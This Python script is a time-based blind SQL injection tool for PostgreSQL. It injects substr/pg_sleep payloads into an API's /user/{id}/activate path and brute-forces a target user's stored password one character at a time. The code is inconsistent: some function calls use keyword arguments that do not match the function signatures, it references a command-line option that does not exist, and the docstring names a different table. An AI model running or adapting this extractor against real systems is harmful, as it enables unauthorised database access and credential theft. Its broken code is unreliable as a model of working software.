#!/usr/bin/env python3
import requests
import string
import time
import argparse
from urllib.parse import quote


def build_payload(userid: int, position: int, ascii_code: int, sleep_time: int) -> str:
    """
    Builds PostgreSQL time-based blind SQLi payload.

    Final SQL shape:
      WHERE id = (3) OR (
        substr((SELECT password FROM password WHERE userid=5), pos, 1)=chr(ascii)
        AND (SELECT(pg_sleep(5))ISNULL)
      )
    """

    raw_payload = (
        f"(3)OR("
        f"(substr((SELECT(password)FROM%09passwords%09WHERE(userid={userid})),{position},1)=chr({ascii_code}))"
        f"AND(SELECT(pg_sleep({sleep_time}))ISNULL)"
        f")"
    )

    # Important:
    # We already intentionally use %09 inside SQL as encoded tabs.
    # Do not encode '%' again.
    return raw_payload


def measure_request(session: requests.Session, url: str, headers: dict, timeout: int) -> tuple[float, int, str]:
    start = time.perf_counter()
    try:
        r = session.post(url, headers=headers, timeout=timeout, allow_redirects=False)
        elapsed = time.perf_counter() - start
        return elapsed, r.status_code, r.text[:200]
    except requests.exceptions.Timeout:
        elapsed = time.perf_counter() - start
        return elapsed, 0, "TIMEOUT"
    except requests.exceptions.RequestException as e:
        elapsed = time.perf_counter() - start
        return elapsed, -1, str(e)


def is_delayed(elapsed: float, threshold: float) -> bool:
    return elapsed >= threshold


def brute_force_password(
    base_url: str,
    target_user_id: int,
    password_length: int,
    sleep_time: int,
    threshold: float,
    request_timeout: int,
    charset: str,
):
    session = requests.Session()

    headers = {
        "Content-Type": "application/json",
    }

    password = ""

    print(f"[+] Target: {base_url}")
    print(f"[+] Target user_id: {target_user_id}")
    print(f"[+] Password length: {password_length}")
    print(f"[+] Charset size: {len(charset)}")
    print(f"[+] Sleep: {sleep_time}s, threshold: {threshold}s")
    print()

    for pos in range(1, password_length + 1):
        found = False

        print(f"[+] Bruting position {pos}/{password_length}... current password: {password!r}")

        for ch in charset:
            ascii_code = ord(ch)
            payload = build_payload(
                user_id=target_user_id,
                position=pos,
                ascii_code=ascii_code,
                sleep_time=sleep_time,
            )

            url = f"{base_url.rstrip('/')}/api/user/{payload}/activate"

            elapsed, status, body_preview = measure_request(
                session=session,
                url=url,
                headers=headers,
                timeout=request_timeout,
            )

            print(f"    [-] pos={pos:02d} char={ch!r} ascii={ascii_code:<3} status={status:<3} time={elapsed:.2f}s")

            if is_delayed(elapsed, threshold):
                password += ch
                found = True
                print(f"[FOUND] position {pos}: {ch!r}")
                print(f"[PASSWORD] {password}")
                print()
                break

        if not found:
            print(f"[!] No character found at position {pos}.")
            print(f"[!] Current password: {password!r}")
            print("[!] Consider increasing sleep time/threshold or expanding charset.")
            break

    return password


def main():
    parser = argparse.ArgumentParser(description="Blind time-based SQLi password brute-forcer")

    parser.add_argument(
        "--url",
        required=True,
        help="Base URL, for example: http://127.0.0.1:8888",
    )
    parser.add_argument(
        "--user-id",
        type=int,
        required=True,
        help="Target userid in passwords table, for example: 5",
    )
    parser.add_argument(
        "--length",
        type=int,
        required=True,
        help="Password length to brute force.",
    )
    parser.add_argument(
        "--sleep",
        type=int,
        default=5,
        help="pg_sleep delay in seconds. Default: 5",
    )
    parser.add_argument(
        "--threshold",
        type=float,
        default=4.5,
        help="Delay threshold in seconds. Default: 4.5",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="HTTP request timeout in seconds. Default: 10",
    )
    parser.add_argument(
        "--charset",
        default=string.ascii_lowercase + string.ascii_uppercase + string.digits,
        help="Characters to brute force. Default: a-zA-Z0-9",
    )

    args = parser.parse_args()

    final_password = brute_force_password(
        base_url=args.url,
        api_key=args.apikey,
        target_user_id=args.user_id,
        password_length=args.length,
        sleep_time=args.sleep,
        threshold=args.threshold,
        request_timeout=args.timeout,
        charset=args.charset,
    )

    print("=" * 60)
    print(f"[FINAL PASSWORD] {final_password}")
    print("=" * 60)


if __name__ == "__main__":
    main()
